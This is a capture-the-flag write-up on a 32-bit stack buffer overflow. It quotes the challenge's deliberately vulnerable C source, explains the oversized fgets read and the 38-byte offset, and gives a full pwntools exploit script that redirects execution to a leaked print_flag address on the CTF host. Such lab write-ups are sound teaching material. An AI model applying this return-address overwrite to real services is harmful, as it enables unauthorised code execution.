<img width="484" height="464" alt="image" src="https://github.com/user-attachments/assets/3b955f2b-b927-4411-b566-edece827824b" />   

Given source code:  
```python
/* Old Memes Never Die 
 * compile without protection, because protection is for Tonies!
 * gcc -m32 -fno-stack-protector -o old-memes old-memes.c
 */

#include <stdio.h>
#include <string.h>


int print_flag(){
    FILE *fptr = fopen("/flag", "r");
    if (fptr == NULL){
        return 1;
    }
    
    char flag[39];
    while (fgets(flag, sizeof(flag), fptr) != NULL){
        printf("F* YOU and your flag: %s !!!", flag);
    }
    fclose(fptr);
    return 0;
}

int ask_what(){
    char what[8];
    char check[6] = "what?";

    printf("\n\nWhat is your name?\n> ");
    fgets(what, sizeof(what), stdin);
    what[strcspn(what, "\r\n")] = 0;
    if (strcmp(check, what) != 0)
        return 1;
    return 0;
}

int ask_name(){
    char name[30];
    printf("\n\nWhat is your name?\n> ");
    fgets(name, 0x30, stdin);
    name[strcspn(name, "\r\n")] = 0;
    printf("F* YOU %s!\n", name);
}

int main(){
    setbuf(stdout, 0);
    printf("(do with this information what you want, but the print_flag function can be found here: %p)\n", print_flag);

    if(ask_what())
        return 1;
    ask_name();
    return 0;
}
```
When run, the program ask us "What is your name?" and answer by "F* YOU + your input" (lol).  
Let's analyze the code and see where we can deploy bufferoverflow.  
```python
    if(ask_what())
        return 1;
    ask_name();
```
First in the `main()` function, after it print `print_flag()` function address, it calls `ask_what()` function. If it's true, it calls `ask_name()` function, if not `return 0;`.  
The `ask_what()` function, check the input with `what?` by using `fgets` and `strcspn` .  
The `ask_name()` function, ask the name again. `name[30]` defined with 30 bytes **BUT** `fgets` is called with `0x30` ~ 48 bytes. That our main point.  
Our payload should be:  

``` 
[filler to get through local] + [overwrite saved EBP (4 bytes, can be junk)] + [4 bytes = address print_flag (little-endian)]
```

After brute-force form 30 to 48, i found the right offset is 38 ( 30 name + 8 padding ).  
Then it should be :

``` 
[ name: 30 bytes ] [ gap/padding: 8 bytes ] [ saved EBP: 4 bytes ] [ saved EIP: 4 bytes ] [ another 2 bytes for pretty ]
```

Python script to inject it:  
```python
#!/usr/bin/env python3
from pwn import *

host = "old-memes-never-die.ctf.zone"
port = 4242
context(arch="i386", os="linux")

def exploit():
    r = remote(host, port)

    # 1) read banner and parse addr print_flag
    line = r.recvline(timeout=3).decode(errors="ignore")
    print(line, end="")
    addr_str = line.strip().split()[-1].rstrip(")")
    addr = int(addr_str, 16)
    log.info(f"print_flag @ {hex(addr)}")

    # 2) answer ask_what
    r.recvuntil(b"> ")
    r.sendline(b"what?")

    # 3) payload according to found offset (38)
    offset = 38
    dummy_ebp = b"BBBB"          # fill saved EBP (value not important)
    payload = b"A" * offset + dummy_ebp + p32(addr) + b"AA"

    log.info(f"Payload len = {len(payload)}; offset={offset}")
    r.recvuntil(b"> ")
    r.sendline(payload)

    # 4) read output (flag in this part)
    try:
        print(r.recvall(timeout=4).decode(errors="ignore"))
    except Exception as e:
        log.warning("recvall exception: " + str(e))
    r.close()

if __name__ == "__main__":
    exploit()

```  
Peace!







